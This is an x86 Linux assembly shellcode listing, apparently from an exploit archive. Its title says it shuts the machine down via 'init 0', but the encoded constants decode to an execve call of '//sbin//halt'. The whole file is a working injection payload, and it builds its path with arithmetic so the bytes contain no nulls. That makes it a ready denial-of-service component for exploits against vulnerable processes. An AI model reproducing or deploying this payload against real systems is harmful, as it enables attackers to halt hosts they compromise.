;Linux/x86 -Shutdown(init 0) Shellcode
; Yiu King Yau
; 2019-02-18
; https://www.exploit-db.com/exploits/37289/

section .text
        global _start

_start:
        xor eax,eax
        push eax
        mov ecx, 0x10101010
        add ecx, 0x645c5158
        push ecx
        mov edi, 0x453cf2ff
        sub ecx, edi
        push ecx
        add edi, 0x1d363c30
        mov ecx, edi
        push ecx
        mov ebx,esp
        push eax
        mov edx,esp
        push ebx
        mov ecx,esp
        mov al, 0xb
        int 0x80
